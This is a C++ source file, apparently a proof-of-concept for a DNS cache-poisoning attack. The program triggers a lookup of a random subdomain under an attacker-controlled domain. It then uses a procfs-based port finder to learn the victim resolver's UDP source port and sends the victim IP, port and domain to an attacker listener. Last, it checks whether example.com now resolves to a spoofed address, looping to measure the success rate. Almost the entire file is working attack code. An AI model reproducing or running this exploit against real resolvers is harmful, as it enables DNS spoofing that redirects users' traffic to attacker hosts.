#include <string>
#include <iostream>
#include <cstring>
#include <set>
#include <cstdio>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>
#include <vector>
#include <future>
#include "procfsPortFinder.h"

using namespace std;
const string ATTACKER_DNS = "attacker.test";
const string POISIONED_DNS = "example.com";
const string ATTACKERS_CONTROL_IP = "192.0.2.70";
const int protocol = PROTOCOL_UDP;
const int DNS_PORT = 53;
const int ATTACKER_LISTENER_PORT = 9999;
const std::string ATTACKER_LISTENER_IP = "192.0.2.49";
std::string VICTIM_IP = "192.0.2.10";
std::string attacker_domain = "";

void init()
{
    // Generate random 4 digits
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(1000, 9999999);
    int random_digits = dis(gen);

    // Build hostname: random4digits.ATTACKER_DNS
    attacker_domain = std::to_string(random_digits) + "." + ATTACKER_DNS;
    std::cout << "Generated attacker domain: " << attacker_domain << std::endl;
}

std::string initate_dns_query(string domain)
{
    std::cout << "Initiating DNS query using getaddrinfo for: " << domain << std::endl;

    addrinfo hints{};
    // hints.ai_family = AF_UNSPEC; // allow IPv4 or IPv6
    hints.ai_family = AF_INET; // allow IPv4
    hints.ai_socktype = 0;

    addrinfo *res = nullptr;
    int gai_err = getaddrinfo(domain.c_str(), nullptr, &hints, &res);
    if (gai_err != 0)
    {
        std::cerr << "getaddrinfo: " << gai_strerror(gai_err) << "\n";
        return "";
    }

    char addrbuf[INET6_ADDRSTRLEN];
    std::set<std::string> unique_addrs;
    for (addrinfo *rp = res; rp != nullptr; rp = rp->ai_next)
    {
        void *addr_ptr = nullptr;
        if (rp->ai_family == AF_INET)
        {
            sockaddr_in *sa = (sockaddr_in *)rp->ai_addr;
            addr_ptr = &sa->sin_addr;
        }
        else if (rp->ai_family == AF_INET6)
        {
            sockaddr_in6 *sa6 = (sockaddr_in6 *)rp->ai_addr;
            addr_ptr = &sa6->sin6_addr;
        }

        if (addr_ptr)
        {
            if (inet_ntop(rp->ai_family, addr_ptr, addrbuf, sizeof(addrbuf)) != nullptr)
            {
                unique_addrs.insert(std::string(addrbuf));
            }
        }
    }

    freeaddrinfo(res);

    if (!unique_addrs.empty())
    {
        std::string result;
        for (const auto &a : unique_addrs)
        {
            std::cout << "[padding]====================Domain: " << domain << " -> IP: " << a << "\n";
            if (result.empty()) // Store the first IP only
                result = a;
        }
        return result;
    }
    else
    {
        std::cout << "[padding]====================No result from getaddrinfo\n";
        return "";
    }
}

void send_victim_info(string victim_ip, uint16_t victim_port)
{
    // Send UDP packet to listener with victim info in format: "IP:PORT:DOMAIN"
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0)
    {
        perror("send_victim_info: socket");
        return;
    }

    // Bind to source port 9999
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_port = htons(10000);
    src_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0)
    {
        perror("send_victim_info: bind");
        close(sock);
        return;
    }

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    // send to localhost listener by default
    addr.sin_port = htons(ATTACKER_LISTENER_PORT);
    if (inet_pton(AF_INET, ATTACKER_LISTENER_IP.c_str(), &addr.sin_addr) != 1)
    {
        perror("send_victim_info: inet_pton");
        close(sock);
        return;
    }

    // Build message "IP:PORT:DOMAIN"
    string msg = victim_ip + ":" + to_string(victim_port) + ":" + attacker_domain;

    ssize_t sent = sendto(sock, msg.c_str(), msg.size(), 0, (struct sockaddr *)&addr, sizeof(addr));
    if (sent < 0)
    {
        perror("send_victim_info: sendto");
    }
    else
    {
        cout << "[send_victim_info] sent: " << msg << "\n";
    }

    close(sock);
}
int main_logic(PortFinderBase &port_finder, int mode)
// mode: 0 - only second (procfs), 1 - both port (bind_all) port, 2 - randomly choose port (bind0)
{
    initate_dns_query(POISIONED_DNS);
    init();
    int p = 0;
    vector<int> occupied_ports;

    // Start first DNS query in parallel with port scanning.
    std::future<std::string> first_ip_future =
        std::async(std::launch::async, initate_dns_query, attacker_domain);

    while (occupied_ports.size() < 3)
    {
        auto t1 = std::chrono::high_resolution_clock::now();
        p = port_finder.port_opened();
        auto t2 = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(t2 - t1).count();
        // std::cout << "Port scan iteration took: " << duration << " ms" << std::endl;
        // std::cout << "Checking port: " << p << std::endl;
        if (p != 0)
        {
            std::cout << "Detected opened port: " << p << std::endl;
        }

        if (p != 0 && p != ATTACKER_LISTENER_PORT)
        {
            occupied_ports.push_back(p);
            std::cout << "Added port " << p << " to occupied_ports list." << std::endl;
        }
    }

    int chosen_port_index = 2;

    send_victim_info(VICTIM_IP, occupied_ports[chosen_port_index]);

    std::string first_ip = first_ip_future.get();

    // Second DNS query at the end
    std::string second_ip = initate_dns_query(POISIONED_DNS);

    // Worked only if both queries match and are not the attacker's control IP.
    return (first_ip == second_ip && !first_ip.empty() && first_ip != ATTACKERS_CONTROL_IP) ? 1 : 0;
}

void measure_time(PortFinderBase &port_finder)
{
    int ITER = 5000;
    long long average_time = 0;
    for (int i = 0; i < ITER; i++)
    {
        auto time1 = std::chrono::high_resolution_clock::now();
        port_finder.port_opened();
        auto time2 = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(time2 - time1).count();
        average_time += duration;
        // std::cout << "Time taken to one ports scan iteration: " << duration << " microseconds" << std::endl;
    }
    average_time /= ITER;
    std::cout << "Average time taken for port scan iteration over " << ITER << " iterations: " << average_time << " microseconds" << std::endl;
}

void loop(int iterations = 100)
{
    // call procfs_wrapper for specified number of iterations
    const int ITERATIONS = iterations;
    int success_count = 0;
    long long max_time_ms = 0;
    bool has_under_1000_ms = false;

    ProcfsPortsFinder procfs_finder(protocol); // mode=0

    for (int i = 0; i < ITERATIONS; i++)
    {
        cout << "============ Iteration " << i + 1 << " =============" << endl;
        cout << "Using port finder: " << typeid(procfs_finder).name() << endl;
        auto iter_start = std::chrono::high_resolution_clock::now();
        procfs_finder.init();
        int worked = main_logic(procfs_finder, 0);
        auto iter_end = std::chrono::high_resolution_clock::now();
        auto iter_duration_ms = std::chrono::duration_cast<std::chrono::milliseconds>(iter_end - iter_start).count();

        if (iter_duration_ms < 2500 && iter_duration_ms > max_time_ms)
        {
            max_time_ms = iter_duration_ms;
            has_under_1000_ms = true;
        }

        if (worked != 0)
            success_count++;
        cout << "worked: " << (worked ? "success" : "failure") << endl;
        cout << "iteration time: " << iter_duration_ms << " ms" << endl;
        cout << "sleep..." << endl;
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }

    int failure_count = ITERATIONS - success_count;
    double success_rate = (100.0 * success_count) / ITERATIONS;
    cout << "============ Statistics ============" << endl;
    cout << "total iterations: " << ITERATIONS << endl;
    cout << "worked: " << success_count << endl;
    cout << "failed: " << failure_count << endl;
    cout << "success rate: " << success_rate << "%" << endl;
    if (has_under_1000_ms)
        cout << "max time took (<1000 ms): " << max_time_ms << " ms" << endl;
    else
        cout << "max time took (<1000 ms): none" << endl;
}
int main(int argc, char *argv[])
{
    std::cout << "Using VICTIM_IP: " << VICTIM_IP << std::endl;
    std::cout << "Attacker listener: " << ATTACKER_LISTENER_IP << ":" << ATTACKER_LISTENER_PORT << std::endl;
    ProcfsPortsFinder procfs_finder(protocol);

    // If argument provided, run loop with that many iterations
    if (argc > 1)
    {
        try
        {
            int iterations = std::stoi(argv[1]);
            std::cout << "Running loop with " << iterations << " iterations" << std::endl;
            loop(iterations);
        }
        catch (...)
        {
            std::cerr << "Invalid iteration count. Usage: " << argv[0] << " [iterations]" << std::endl;
            return 1;
        }
    }
    else
    {
        // No argument: run main_logic once
        main_logic(procfs_finder, 0);
    }

    return 0;
}
